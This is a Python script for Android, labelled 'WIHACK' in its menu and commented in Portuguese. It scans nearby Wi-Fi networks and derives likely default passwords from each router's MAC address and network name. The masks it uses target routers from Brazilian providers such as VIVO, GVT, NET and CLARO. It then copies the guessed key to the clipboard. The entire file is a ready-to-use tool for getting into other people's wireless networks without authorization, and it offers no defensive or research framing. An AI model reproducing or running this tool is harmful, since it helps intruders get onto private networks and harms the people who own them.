import androidhelper
droid = androidhelper.Android()


# Padrao usando apenas o mac

def_bid = [
        
'00:XX:XX:XX:XX:XX',
'00:00:XX:XX:XX:XX',
'xx:xx:xx:xx:xx:xx'
        
]
	

# Padrao usando apenas o mac + nome
	
def_eid = [
        
'00:XX:XX:XX:00:00 VIVO-XXXX',
# '00:xx:xx:00:00:xx VIVO-xxxx-0G',
# '00:xx:xx:00:00:xx CLARO-xxxx-0G',
'00:XX:XX:XX:00:00 GVT-XXXX',
'00:00:XX:00:00:00 NET_0GXXXXXX',
'00:00:XX:00:00:00 CLARO_0GXXXXXX'
        
]

# Obtém informações das redes próximas 

def scan_results():
    while True:
        droid.wifiStartScan()
        nets = droid.wifiGetScanResults()
        
        if len(nets[1]) > 0:
            return nets[1]


# Copia texto

clip = droid.setClipboard


# Verifica se o regex obteve algum valor 

def reif(regex, string, quant=0):
    from re import findall
    
    return len(findall(regex, string)) > quant


# Tenta obter a senha padrão
# com o mac + nome_da_rede

def getkeys(bid, eid=None):
    from re import sub
    
    global def_bid
    global def_eid
    
    keys = []

    if eid != None:
        masker = def_eid
        fakey = f'{bid} {eid}'

    else:        
        masker = def_bid
        fakey = bid

    
    for index, mask in enumerate(masker):
        
        key = ''        
        regex = sub(r'[0Xx]', r'.', mask)
        
        if reif(regex, fakey):
            
            for i, m in enumerate(mask):
                if m == 'X':
                    key += fakey[i].upper()
            
                elif m == 'x':
                    key += fakey[i].lower()
                    
            keys += [key]
            
    return keys


# Limpa a tela    
    
def cl():
    from subprocess import call
    call('clear', shell=True)


# Le um numero inteiro

def read_int(prompt):
    while True:
        try:
            return int(input(prompt))
        except (ValueError, TypeError):
            print('\033[1;31mTente novamente, digite um número inteiro\033[m')


# Cria um menu

def menu(*items):
    print(f'\033[34;1m]{"-"*15}[\033[31mWIHACK\033[34m]\n')
    for i, item in enumerate(items):
        label = f'\033[1;31m[{i+1}]-\033[34m{item}\033[m'
        
        if not reif('\[|\]', item, 0):
            label = f'\033[1;31m[{i+1}]-\033[34m[{item}]\033[m'
            
        print(label)
        
        
    print()
    while True:
        op = read_int('>>> ')
            
        if 0 < op <= len(items):
            break
        else:
            print('\033[1;31mTente novamente, digite um número entre as opções\033[m')
    return op - 1


# Programa Principal

while True:
    nets = scan_results()
    
    cl()
    
    list_nets = ['Rescan', 'Sair']

    for net in nets:
        eid = net['ssid']
        sig = net['level']
        
    
        list_nets.insert(0, f'\033[31m---------\033[34m[{sig}%]-[{eid}]')
        
        
    op = menu(*list_nets)
        
    if list_nets[op] in 'Rescan':
        continue
        
    elif list_nets[op] in 'Sair':
        break
        
    bid = nets[op]['bssid']
    eid = nets[op]['ssid']
    
    #bid = '11:22:33:44:55:66'
    #eid = 'VIVO-1234'
    
    keys = getkeys(bid, eid)
    
    if len(keys) == 0:
        keys = getkeys(bid)
        
    
    keys.append('[Voltar]')
        
    while True:
        cl()
        opc = menu(*keys)
        
        if keys[opc] == '[Voltar]':
            break
        else:
            clip(keys[opc])            
